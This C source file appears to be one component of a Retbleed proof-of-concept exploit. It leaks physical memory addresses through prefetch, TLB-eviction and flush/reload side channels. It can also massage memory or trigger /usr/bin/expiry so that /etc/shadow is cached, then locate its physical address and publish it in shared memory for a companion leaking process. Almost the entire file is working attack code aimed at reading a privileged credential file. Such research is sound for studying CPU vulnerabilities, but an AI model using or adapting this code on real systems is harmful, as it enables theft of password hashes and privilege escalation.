#include <fcntl.h>
#include <string.h>
#include "retbleed.h"
#include "../massaging/massage_shadow.h"

#define NBUFS (96)
#define BUF_STRIDE_BITS (12+7)

// there's no point in using THPs, it's actually slower
/* #define ALLOW_THP */

void tlb_flush(u8 **tlbs) {
    for (size_t k = 0; k < NBUFS; ++k) {
        volatile void *p = tlbs[k]+0x540;
        *(volatile char* volatile)p ;
        if( k > 1 ) {
            volatile void *p = tlbs[k-2]+0x140;
            *(volatile char* volatile)p ;
        }
        if( k > 2 ) {
            volatile void *p = tlbs[k-1]+0x140;
            *(volatile char* volatile)p ;
        }
    }
    for (size_t k = NBUFS-1; k > 0 ; --k) {
        volatile void *p = tlbs[k]+0x540;
        *(volatile char* volatile)p ;
    }
}

unsigned long to_pa(void *ptr) {
    int fd_pagemap = open("/proc/self/pagemap", O_RDONLY);
    if (fd_pagemap <= 0) {
        err(1, "bah.");
    }
    long pa = va_to_phys(fd_pagemap, (long)ptr);
    close(fd_pagemap);
    return pa;
}

unsigned long mem_info_init (void* victim) {
    __attribute__((aligned(4096))) size_t results[256] = {0};

    // local reloadbuffer just for finding rb->pa
#ifdef ALLOW_THP
    u8 *reloadbuffer = mmap_huge((u8 *)(0x132UL<<21), 1<<21);
#else
    u8 *reloadbuffer = map_or_die((u8 *)(0x12fafafa000), 1<<21);
#endif

    // random whatever address..
    u8* leak = map_or_die((u8*)0x210eeff01000UL, 0x2000);
    leak[0] = 1;
    leak[0x1000] = 1;

    // you could all be part of the big an happy buffer.
    /* mmap_huge(victim, 1UL<<21); */

    u8 *bufs[NBUFS];
    for (long i = 0 ; i < NBUFS; ++i ) {

        /// approximately tlbleed. skylake
        bufs[i] = (u8 *)(((u64)victim) ^ (((1UL+i) << 33)| ((1UL+i)<<12) | ((1UL+i)<<19)));
        /* bufs[i] = (u8 *)(((u64)victim) | ((i+1UL)<<35)); */
#ifdef ALLOW_THP
        mmap_huge(bufs[i], 1UL<<21);
#else
        map_or_die(bufs[i], 0x1000);
        *(u8*)bufs[i]=i;
#endif
    }

    u64 t0 = get_ms();
    long gotsofar;
    for (;;) {
        // maybe we should allocate new tlb-eviction buffers here too.
        //
        /* int r = rand()%NBUFS; // randomly select a pa */
        /* void *tmp = bufs[r]; */
        /* bufs[r] = victim; */
        /* victim = tmp; */
        // sorry no more switcihng if rb is hard to reverse.

        /* INFO("Leak PA of %p (LP-MDS)... (%lx)\n", victim, to_pa(victim)); */

        //long prefix   = 0x80000000000008e7L; HUGE
        long mask     = 0xfffffff800000fffL;
        long prefix   = 0x8000000000000867L; //normal
        gotsofar = 0;
#define MIN_ROT 12
/* #define MIN_ROT 20 */
        reloadbuffer[0] = 1;

        /* for (char rotate = 28; rotate >= MIN_ROT; rotate -= 8) { */
        for (char rotate = 33; rotate >= MIN_ROT; rotate -= 3) {
            memset(results, 0, sizeof(results));
            /* INFO("0x%09lx", gotsofar); */
            /* fflush(stdout); */
            /* mask |= 0xffL<<rotate; */
            mask |= 0x7L<<rotate;
#define MAX_ITS 5000
            int i;
            for(i = 0; i < MAX_ITS; ++i) {
                madvise(leak, 2*4096, MADV_DONTNEED);
#define cpuid asm volatile("cpuid" ::: "eax", "ebx","ecx","edx");
                /* flush_range(reloadbuffer, 1<<9, 0x100); */
                flush_range(reloadbuffer, 1<<9, 32);
                tlb_flush(bufs);
                reloadbuffer[0xfff] = 1;
                __asm__ volatile(
                        "sfence\n"
                        "movq (%0), %%r13\n"
                        "movq (%[tgt]), %%r12\n"
                        "andq %[mask], %%r13\n"
                        "xorq %[prefix], %%r13\n"
                        "rorq %[rotate], %%r13\n"
                        "shl $0x9, %%r13\n"
                        "prefetcht0 (%%r13, %1)\n"
                        "mfence\n"
                        ::"r"(leak + 0x103f),
                        "r"(reloadbuffer),
                        [prefix]"r"(prefix),
                        [mask]"r"(mask),
                        [rotate]"c"(rotate),
                        [tgt]"r"(victim+0xc80): "r13", "r12");
                /* reload_range(reloadbuffer, 1<<9, 0x100, results); */
                reload_range(reloadbuffer, 1<<9, 32, results);
                // We're zero-biased so ignore leaking pages with 0.
                results[0] = 0;
                /* size_t max  = max_index(results, 0xff); */
                size_t max  = max_index(results, 0x7);
                if (results[max] > 5) {
                    break;
                }
            }
            /* size_t max  = max_index(results, 0xff); */
            size_t max  = max_index(results, 7);
            if (i == MAX_ITS) {
                // it must have been 3 zeroes..
                continue;
            }
            if (results[max] == 0) {
              goto restart; // haha no.
            }
            prefix     |= max<<rotate;
            gotsofar   |= max<<rotate;
        }

        if (gotsofar == 0) {
restart:;
            /* ERROR("\n"); */
            gotsofar = 0;
            break;
        }

        /* SUCCESS("0x%09lx", gotsofar); */
        /* printf(" t=%lums\n", get_ms() - t0); */
        /* fflush(stdout); */
        break;
    }

    for (long i = 0 ; i < NBUFS; ++i ) {
#ifdef ALLOW_THP
        munmap(bufs[i], 1<<21);
#else
        munmap(bufs[i], 0x1000);
#endif
    }
    munmap(reloadbuffer, 1<<21);
    munmap(leak, 0x2000);
    /* DEBUG("pa=%lx\n", gotsofar); */
    return gotsofar;
}

// hi, my duty is to provide shared memory..
// I could also be a nice program and reverse the physical address it maps to
// but actually I rather not...
int main(int argc, char *argv[])
{
    setbuf(stdout, NULL);
    u64 va = (1ul<<46);
    u8 *buf = (u8 *)va;
    unlink(SHM_PATH);
    map_shared(SHM_PATH, (void *)va, SHM_SZ, O_CREAT | O_RDWR);
    // header
    struct rb_phys *rbph = (struct rb_phys *)buf;
    int massage = 0;
    int threads = 8;
    int opt;
    while ((opt = getopt(argc, argv, "hmt:")) != -1) {
        switch (opt) {
        case 'm':
            massage = 1;
            break;
        case 't':
            threads = atoi(optarg);
            break;
        case 'h':
        default:
            fprintf(stderr, "Usage: %s [-hm] [-t threads]\n", argv[0]);
            exit(1);
        }
    }

    if (massage) {
        void *mass_buf;
        u64 mass_buf_pa;
        u64 t0=get_ms();
        if (allocate_contiguous_massage_shadow(mem_info_init, 0, &mass_buf, &mass_buf_pa, &rbph->shadow_pa)) {
            printf("failed 3\n");
            return 3;
        }
        INFO("massage: %0.2fs\n", (get_ms()-t0) / 1000.0);
        SUCCESS("/etc/shadow hint %lx\n", rbph->shadow_pa);
    } else {
        if (fork() == 0) {
            // make sure /eth/shadow is cached...
            execl("/usr/bin/expiry", "expiry", "-c", NULL);
        }
    }

    // start from 2nd page
    buf = &buf[0x1000];
    for (int i = 0; i < threads; ++i) {
        // map in
        buf[i<<12] = i;

        void *ptr = &buf[i<<12];
        // expected becomes 0 unless we're root
        u64 expected = to_pa(ptr);

        // phys[0] -> shmbuf[0x1000]
        // phys[1] -> shmbuf[0x2000]
        rbph->phys[i] = mem_info_init(ptr);

        if (rbph->phys[i] == 0 || expected != 0 && expected != rbph->phys[i]) {
            // let's assume this doesn't happen :)
            ERROR("FAILED: %lx != %lx\n", expected, rbph->phys[i]);
            return 1;
        } else {
            SUCCESS("rbph->phys[%d/%d] = 0x%lx", i+1, threads, rbph->phys[i]);
            if (expected == rbph->phys[i]) {
                printf(" Confirmed!\n");
            } else {
                printf("\n");
            }
        }
    }
    return 0;
}
